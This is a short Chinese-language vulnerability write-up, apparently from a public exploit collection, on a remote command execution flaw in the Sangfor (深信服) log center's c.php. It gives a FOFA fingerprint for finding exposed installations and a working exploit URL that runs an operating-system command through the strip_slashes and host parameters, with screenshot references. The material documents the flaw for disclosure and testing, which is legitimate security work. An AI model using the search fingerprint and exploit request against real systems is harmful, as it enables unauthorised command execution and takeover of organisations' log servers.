#  深信服-日志中心-c.php-远程命令执行漏洞

## 漏洞描述

深信服 日志中心 c.php  远程命令执行漏洞，使用与EDR相同模板和部分文件导致命令执行

## 漏洞影响

> [!NOTE]
>
> 深信服 日志中心

## FOFA

> [!NOTE]
>
> body="isHighPerformance : !!SFIsHighPerformance,"

## 漏洞复现

登录页面如下

![image-20210531192407444](深信服-日志中心-c.php-远程命令执行漏洞.assets/16273630899811761.jpg)

访问漏洞Url

```
/tool/log/c.php?strip_slashes=system&host=ipconfig
```

![image-20210531192540462](深信服-日志中心-c.php-远程命令执行漏洞.assets/16273630902443829.jpg)